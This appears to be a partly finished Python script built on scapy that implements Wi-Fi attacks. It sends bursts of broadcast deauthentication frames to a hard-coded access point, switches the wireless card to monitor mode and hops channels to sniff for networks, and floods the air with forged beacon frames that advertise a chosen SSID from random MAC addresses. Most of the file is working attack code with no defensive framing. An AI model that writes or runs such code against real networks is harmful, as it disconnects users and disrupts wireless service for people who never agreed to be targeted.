from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, sendp, conf, Dot11Beacon, Dot11ProbeResp, Dot11Elt
from scapy.all import send, sniff, RandMAC, get_if_hwaddr
from scapy.all import *
import os
from multiprocessing import Process
import random
import time


class deauth:

    def __init__(self, valueObj):
        self.valueObj = valueObj
        self.found_APs = []


    def attack(self):
        print("do stuff")


        # Scan for APs

        client = "FF:FF:FF:FF:FF:FF"
        ap = "cc:32:e5:32:4e:b2"
        # deauth packet for AP

        packet = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()

        #interface must be the monitor one
        sendp(packet, iface=self.valueObj.interfaceName, count=100, inter=0.1 ,verbose=1)


		
    def channel_hopper(self):
        while True:
            try:
                channel = random.randrange(1,13)
                os.system("iwconfig {} channel {}".format(self.valueObj.interfaceName, channel))
                time.sleep(1)
            except KeyboardInterrupt:
                break



    def packet_handler(self, packet):
        try:
            if (packet.haslayer(Dot11)):
 
                if (packet.type == 0 and packet.subtype == 8):
                    if (packet.addr2 not in self.found_APs):
                        self.found_APs.append(packet.addr2)
                        print("Access point MAC: " + str(packet.addr2) + " with SSID " + str(packet.info) + " on channel " + str(int(ord(packet[Dot11Elt:3].info))))
                        
        except:
            raise
        


    def findAP(self):
        os.system("ifconfig " + self.valueObj.interfaceName + " down")
        os.system("iwconfig " + self.valueObj.interfaceName + " mode monitor")
        os.system("ifconfig " + self.valueObj.interfaceName + " up")


        result = sniff(iface=self.valueObj.interfaceName, prn=self.packet_handler, store=0, timeout=2)
        print(result)
        print(self.found_APs)


    def spam(self):
        sender_mac = str(RandMAC())
        ssid = ""
        frames = []
        if (self.valueObj.SSIDdict == True):
            # read ssid by eachj thing
            print("to do")
        else:
            ssid = self.valueObj.SSID
            print(ssid)



        dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
        beacon = Dot11Beacon(cap="ESS+privacy")
        essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
        rsn = Dot11Elt(ID='RSNinfo', info=(
          '\x01\x00'                 #RSN Version 1
          '\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
          '\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
          '\x00\x0f\xac\x04'         #AES Cipher
          '\x00\x0f\xac\x02'         #TKIP Cipher
          '\x01\x00'                 #1 Authentication Key Managment Suite (line below)
          '\x00\x0f\xac\x02'         #Pre-Shared Key
          '\x00\x00'))               #RSN Capabilities (no extra capabilities)
        frame = RadioTap()/dot11/beacon/essid/rsn
        frames.append(frame)
        sendp(frames, inter=0.0100, iface=self.valueObj.interfaceName if len(frames)<10 else 0, loop=1)



